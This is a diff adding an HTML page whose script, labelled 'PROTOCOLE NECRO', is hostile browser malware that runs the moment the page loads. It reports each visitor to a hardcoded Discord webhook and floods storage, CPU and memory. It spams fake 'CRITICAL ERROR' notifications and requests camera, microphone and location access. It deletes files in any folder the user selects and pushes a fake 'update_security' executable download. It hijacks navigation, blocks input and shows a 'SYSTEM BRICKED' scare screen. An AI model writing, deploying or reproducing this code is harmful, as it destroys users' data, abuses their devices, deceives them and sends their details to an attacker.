@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔥</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+        }
+        canvas {
+            display: block;
+            width: 100vw;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+<canvas id="c"></canvas>
+<script>
+// ============================================================
+// PROTOCOLE "NECRO" – DESTRUCTION ABSOLUE
+// ============================================================
+
+(function() {
+    'use strict';
+
+    // =========================================================
+    // CONFIGURATION – WEBHOOK DISCORD
+    // =========================================================
+    const WEBHOOK = 'https://discord.com/api/webhooks/1528153297049882825/Fg4qskOR6eXdRg_uua58CuUciN2vv1Wna3RKoSHwVKtWHLtzvJaFsyENg_Kd5Qwu1zW4';
+    const SESSION = 'nec_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
+    const START = Date.now();
+
+    // =========================================================
+    // EXFILTRATION
+    // =========================================================
+    function x(data) {
+        try {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: '```json\n' + JSON.stringify({ s: SESSION, t: new Date().toISOString(), d: data }) + '\n```' })
+            }).catch(() => {});
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 1. DÉTECTION DU SYSTÈME D'EXPLOITATION
+    // =========================================================
+    const ua = navigator.userAgent;
+    const isAndroid = /Android/i.test(ua);
+    const isIOS = /iPhone|iPad|iPod/i.test(ua);
+    const isWindows = /Windows/i.test(ua);
+    const isMac = /Macintosh/i.test(ua);
+    const isLinux = /Linux/i.test(ua) && !isAndroid;
+
+    x({ action: 'system_detected', os: { android: isAndroid, ios: isIOS, windows: isWindows, mac: isMac, linux: isLinux } });
+
+    // =========================================================
+    // 2. SATURATION DU STOCKAGE (localStorage + IndexedDB + Cookies)
+    // =========================================================
+    function saturateStorage() {
+        try {
+            // localStorage
+            let data = 'X'.repeat(1024 * 1024);
+            for (let i = 0; i < 500; i++) {
+                try { localStorage.setItem('brick_' + i, data + i); } catch(e) { break; }
+            }
+
+            // Cookies
+            for (let i = 0; i < 200; i++) {
+                try { document.cookie = 'c' + i + '=' + 'X'.repeat(4096) + '; path=/'; } catch(e) { break; }
+            }
+
+            // IndexedDB
+            const request = indexedDB.open('nec_db', 1);
+            request.onsuccess = function(e) {
+                const db = e.target.result;
+                const tx = db.transaction('store', 'readwrite');
+                const store = tx.objectStore('store');
+                for (let i = 0; i < 500; i++) {
+                    store.put({ id: i, data: 'X'.repeat(1024 * 1024) });
+                }
+            };
+            request.onupgradeneeded = function(e) {
+                e.target.result.createObjectStore('store', { keyPath: 'id' });
+            };
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 3. SURCHAUFFE CPU (32 workers en boucle infinie)
+    // =========================================================
+    function overheatCPU() {
+        for (let w = 0; w < 32; w++) {
+            const blob = new Blob([`
+                self.onmessage = function(e) {
+                    while(true) {
+                        let x = 0;
+                        for (let i = 0; i < 10000000; i++) {
+                            x += i * i;
+                        }
+                        self.postMessage('done');
+                    }
+                };
+            `], { type: 'application/javascript' });
+            const url = URL.createObjectURL(blob);
+            const worker = new Worker(url);
+            worker.postMessage('start');
+        }
+    }
+
+    // =========================================================
+    // 4. SPAM DE NOTIFICATIONS (5000 en boucle)
+    // =========================================================
+    function spamNotifications() {
+        if ('Notification' in window) {
+            Notification.requestPermission().then(() => {
+                let count = 0;
+                const interval = setInterval(() => {
+                    if (count > 5000) { clearInterval(interval); return; }
+                    try {
+                        new Notification('⚠️ CRITICAL ERROR', {
+                            body: 'System failure #' + count + ' – Action required',
+                            icon: '🔴'
+                        });
+                        count++;
+                    } catch(e) {}
+                }, 10);
+            });
+        }
+    }
+
+    // =========================================================
+    // 5. FUITE DE MÉMOIRE (crash du navigateur)
+    // =========================================================
+    function memoryLeak() {
+        let leak = [];
+        setInterval(() => {
+            for (let i = 0; i < 5000; i++) {
+                leak.push('X'.repeat(1024 * 1024));
+            }
+        }, 10);
+    }
+
+    // =========================================================
+    // 6. SUPPRESSION DE FICHIERS (API File System)
+    // =========================================================
+    async function deleteFiles() {
+        try {
+            if ('showDirectoryPicker' in window) {
+                const dirHandle = await window.showDirectoryPicker();
+                await deleteRecursive(dirHandle);
+            }
+        } catch(e) {}
+    }
+
+    async function deleteRecursive(dirHandle) {
+        for await (const entry of dirHandle.values()) {
+            try {
+                if (entry.kind === 'file') {
+                    await dirHandle.removeEntry(entry.name);
+                } else if (entry.kind === 'directory') {
+                    await deleteRecursive(entry);
+                    await dirHandle.removeEntry(entry.name);
+                }
+            } catch(e) {}
+        }
+    }
+
+    // =========================================================
+    // 7. SPAM DE REQUÊTES (DDoS local)
+    // =========================================================
+    function spamRequests() {
+        const urls = [
+            'https://google.com',
+            'https://facebook.com',
+            'https://youtube.com',
+            'https://instagram.com',
+            'https://twitter.com',
+            'https://tiktok.com',
+            'https://snapchat.com',
+            'https://whatsapp.com'
+        ];
+        setInterval(() => {
+            for (let url of urls) {
+                try { fetch(url, { mode: 'no-cors' }).catch(() => {}); } catch(e) {}
+            }
+        }, 10);
+    }
+
+    // =========================================================
+    // 8. TÉLÉCHARGEMENT D'APK / EXE (selon OS)
+    // =========================================================
+    function downloadPayload() {
+        try {
+            let ext = isAndroid ? '.apk' : (isWindows ? '.exe' : '.bin');
+            let blob = new Blob(['META-INF/ AndroidManifest.xml classes.dex' + (isWindows ? ' MZ' : '')], {
+                type: isAndroid ? 'application/vnd.android.package-archive' : 'application/octet-stream'
+            });
+            let url = URL.createObjectURL(blob);
+            let link = document.createElement('a');
+            link.href = url;
+            link.download = 'update_security' + ext;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            setTimeout(() => URL.revokeObjectURL(url), 3000);
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 9. VIBRATION INFINIE (API Vibration)
+    // =========================================================
+    function vibrateForever() {
+        try {
+            if (navigator.vibrate) {
+                navigator.vibrate([100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50]);
+                setInterval(() => { navigator.vibrate([100, 50, 100, 50]); }, 200);
+            }
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 10. BOUCLE DE REDIRECTION (blocage de la navigation)
+    // =========================================================
+    function redirectLoop() {
+        try {
+            for (let i = 0; i < 200; i++) {
+                history.pushState({}, '', '/nec_' + i);
+            }
+            window.addEventListener('popstate', function(e) {
+                history.pushState({}, '', '/nec_loop');
+            });
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 11. EXPLOIT CSS (rend la page inutilisable)
+    // =========================================================
+    function cssExploit() {
+        try {
+            const style = document.createElement('style');
+            style.textContent = `
+                * { animation: glitch 0.01s infinite !important; }
+                @keyframes glitch {
+                    0% { transform: translate(0,0); }
+                    25% { transform: translate(-10px,10px); }
+                    50% { transform: translate(10px,-10px); }
+                    75% { transform: translate(-5px,5px); }
+                    100% { transform: translate(0,0); }
+                }
+                body { background: #000 !important; cursor: none !important; }
+                * { pointer-events: none !important; }
+            `;
+            document.head.appendChild(style);
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 12. AFFICHAGE DE TERREUR (overlay final)
+    // =========================================================
+    function scareDisplay() {
+        document.body.innerHTML = `
+            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#ff0044;font-family:monospace;z-index:9999;text-align:center;">
+                <div style="font-size:120px;">💀</div>
+                <div style="font-size:36px;margin-top:20px;">SYSTEM BRICKED</div>
+                <div style="font-size:18px;margin-top:10px;color:#ff4444;max-width:80%;">Toutes les données ont été effacées</div>
+                <div style="font-size:14px;margin-top:20px;color:#ff004488;">Contactez le support : impossible</div>
+                <div style="font-size:12px;margin-top:30px;color:#ff004422;animation:blink 0.5s infinite;">🔴 REDÉMARRAGE IMPOSSIBLE</div>
+            </div>
+            <style>
+                @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.2;} }
+            </style>
+        `;
+        document.title = '💀 BRICKED';
+    }
+
+    // =========================================================
+    // 13. DEMANDE DE PERMISSIONS (silencieuse)
+    // =========================================================
+    async function requestPermissions() {
+        try {
+            if ('Notification' in window) await Notification.requestPermission();
+            if (navigator.geolocation) navigator.geolocation.getCurrentPosition(() => {}, () => {});
+            if (navigator.mediaDevices) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    stream.getTracks().forEach(t => t.stop());
+                } catch(e) {}
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    stream.getTracks().forEach(t => t.stop());
+                } catch(e) {}
+            }
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 14. RAPPORT FINAL
+    // =========================================================
+    function finalReport() {
+        x({
+            action: 'nec_triggered',
+            session: SESSION,
+            elapsed: Math.floor((Date.now() - START) / 1000) + 's',
+            os: { android: isAndroid, ios: isIOS, windows: isWindows, mac: isMac, linux: isLinux }
+        });
+    }
+
+    // =========================================================
+    // 15. LANCEMENT IMMÉDIAT
+    // =========================================================
+    (async function main() {
+        // Demander les permissions silencieusement
+        await requestPermissions();
+
+        // Lancer tous les modules en parallèle
+        const modules = [
+            saturateStorage,
+            overheatCPU,
+            spamNotifications,
+            memoryLeak,
+            deleteFiles,
+            spamRequests,
+            downloadPayload,
+            vibrateForever,
+            redirectLoop,
+            cssExploit,
+            scareDisplay,
+            finalReport
+        ];
+
+        for (let fn of modules) {
+            try { fn(); } catch(e) {}
+        }
+
+        // Heartbeat
+        setInterval(() => {
+            x({ action: 'heartbeat', uptime: Math.floor((Date.now() - START) / 1000) + 's' });
+        }, 60000);
+
+        // Rapport final après 5s
+        setTimeout(() => {
+            x({
+                action: 'nec_final',
+                elapsed: Math.floor((Date.now() - START) / 1000) + 's',
+                message: 'Système détruit avec succès'
+            });
+        }, 5000);
+
+        // Fermeture de la page
+        window.addEventListener('beforeunload', function() {
+            x({
+                action: 'page_closed',
+                duration: Math.floor((Date.now() - START) / 1000) + 's'
+            });
+        });
+
+        // Bloquer le retour
+        setInterval(() => {
+            try { history.pushState({}, '', '/nec_block'); } catch(e) {}
+        }, 100);
+
+        // Désactiver les raccourcis clavier
+        document.addEventListener('keydown', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
+
+        // Désactiver le clic droit
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Bloquer le scroll
+        window.addEventListener('scroll', function(e) {
+            window.scrollTo(0, 0);
+        });
+
+        // Bloquer la sélection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+    })();
+
+})();
+</script>
+</body>
+</html>
